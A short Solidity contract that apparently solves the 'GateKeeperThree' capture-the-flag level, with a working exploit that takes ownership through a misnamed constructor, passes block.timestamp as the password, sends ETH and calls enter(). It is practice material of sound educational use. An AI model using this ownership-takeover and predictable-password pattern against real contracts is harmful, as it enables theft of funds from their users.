// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IGateKeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

interface IAttack {
    function enter(address target) external payable;
}

contract MyGateKeeperThreeAttack is IAttack {
    function enter(address target) external payable override {
        // target contract
        IGateKeeperThree keeper = IGateKeeperThree(target);

        // become target owner
        keeper.construct0r();

        // instantiate Trick contract
        keeper.createTrick();

        // get allowance, use block.timestamp as password
        // block.timestamp is same for both keeper and trick contracts
        keeper.getAllowance(block.timestamp);

        // send eth
        (bool res, ) = address(keeper).call{ value: msg.value }("");
        res;

        keeper.enter();
    }
}
